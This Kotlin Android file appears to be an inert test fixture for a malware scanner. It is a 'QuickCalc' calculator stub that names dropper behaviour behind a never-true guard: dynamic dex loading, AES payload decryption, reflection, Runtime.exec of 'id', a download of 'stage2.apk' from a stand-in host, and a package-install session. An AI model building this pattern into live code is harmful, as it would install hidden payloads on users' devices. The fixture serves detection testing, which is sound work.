package com.fixture.quickcalc

import android.app.Activity
import android.os.Bundle
import android.widget.TextView
import java.nio.ByteBuffer

/**
 * FIXTURE 2 — "QuickCalc" (expected: HIGH/CRITICAL).
 *
 * INERT dropper look-alike. All loader/installer/crypto/reflection APIs are referenced in
 * bytecode but guarded behind [NEVER] and never executed.
 */
class MainActivity : Activity() {

    private val NEVER: Boolean = System.nanoTime() == 1L

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val tv = TextView(this)
        tv.setPadding(48, 96, 48, 48)
        tv.text = "INERT TEST FIXTURE\n“QuickCalc” (expected: HIGH)\n\n" +
            "A calculator that references dropper behaviour: dynamic code loading, package " +
            "install, payload decryption, reflection and network download — all guarded off. " +
            "Safe to install and demo."
        setContentView(tv)
        capabilitiesNeverRun()
    }

    @Suppress("unused", "DEPRECATION")
    private fun capabilitiesNeverRun() {
        if (!NEVER) return
        // ---- compiled, never executed ----

        // Dynamic code loading
        val dcl = dalvik.system.DexClassLoader("/x", null, null, javaClass.classLoader)
        dcl.loadClass("x")
        val imcl = dalvik.system.InMemoryDexClassLoader(ByteBuffer.allocate(0), javaClass.classLoader)
        imcl.loadClass("y")

        // Payload decrypt
        val cipher = javax.crypto.Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.doFinal(android.util.Base64.decode("AA==", android.util.Base64.DEFAULT))

        // Reflection
        val m = String::class.java.getMethod("length")
        m.invoke("x")
        Class.forName("java.lang.String")

        // Process exec
        Runtime.getRuntime().exec("id")
        ProcessBuilder("id").start()

        // Network download + install
        val conn = java.net.URL("http://example.invalid/stage2.apk")
            .openConnection() as java.net.HttpURLConnection
        conn.inputStream.close()
        packageManager.packageInstaller.createSession(
            android.content.pm.PackageInstaller.SessionParams(
                android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )
        )
    }
}
